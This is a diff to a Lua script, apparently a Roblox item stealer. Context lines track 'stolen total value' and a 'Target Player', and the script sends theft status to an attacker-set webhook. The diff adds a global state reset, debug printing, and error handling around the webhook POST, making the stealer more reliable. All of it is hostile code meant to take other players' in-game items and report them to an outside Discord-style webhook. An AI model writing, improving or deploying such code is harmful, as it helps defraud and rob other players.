@@ -24,6 +24,16 @@ local webhook = _G.webhook or ""
 local currentStatus = "PENDING" -- Live status tracking
 local stolenTotalValue = 0 -- Track total stolen value
 
+-- Reset global variables on script execution
+local function resetGlobalState()
+    itemsToSend = {}
+    allItemsList = {}
+    currentStatus = "PENDING"
+    stolenTotalValue = 0
+end
+
+resetGlobalState()
+
 -- Validation
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -177,6 +187,8 @@ local function sendSimpleStatusWebhook(newStatus, targetPlayerName, reason)
         ["FAILED"] = "🟥"
     }
     
+    print("[SIMPLE WEBHOOK] Sending status:", newStatus, "for player:", targetPlayerName, "reason:", reason) -- Debug output
+    
     local fields = {
         {
             name = "👤 Target Player",
@@ -214,19 +226,25 @@ local function sendSimpleStatusWebhook(newStatus, targetPlayerName, reason)
         ["Content-Type"] = "application/json"
     }
     
-    pcall(function()
-        request({
+    local success, err = pcall(function()
+        local response = request({
             Url = webhook,
             Method = "POST",
             Headers = headers,
             Body = body
         })
+        print("[WEBHOOK] Status webhook sent successfully for:", newStatus)
     end)
+    
+    if not success then
+        print("[WEBHOOK ERROR] Failed to send status webhook:", err)
+    end
 end
 
 -- Update live status and send webhook
 local function updateStatus(newStatus, allItems, tradeItems, tokens)
     currentStatus = newStatus
+    print("[STATUS UPDATE] Status changed to:", newStatus) -- Debug output
     SendWebhookMessage(false, allItems, tradeItems, tokens)
 end
 
